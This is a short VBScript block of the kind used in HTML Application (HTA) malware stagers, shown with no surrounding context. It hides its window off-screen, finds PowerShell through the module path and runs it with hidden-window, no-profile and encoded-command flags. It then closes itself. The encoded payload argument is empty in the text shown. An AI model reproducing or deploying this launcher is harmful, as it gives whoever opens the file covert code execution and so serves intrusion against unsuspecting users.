<script language="VBScript">
  window.moveTo -4000, -4000
  Set kggAO = CreateObject("Wscript.Shell")
  Set sxwGBVZ2XX = CreateObject("Scripting.FileSystemObject")
  For each path in Split(kggAO.ExpandEnvironmentStrings("%PSModulePath%"),";")
    If sxwGBVZ2XX.FileExists(path + "\..\powershell.exe") Then
      kggAO.Run "powershell.exe -nop -w hidden -e ",0
      Exit For
    End If
  Next
  window.close()
</script>
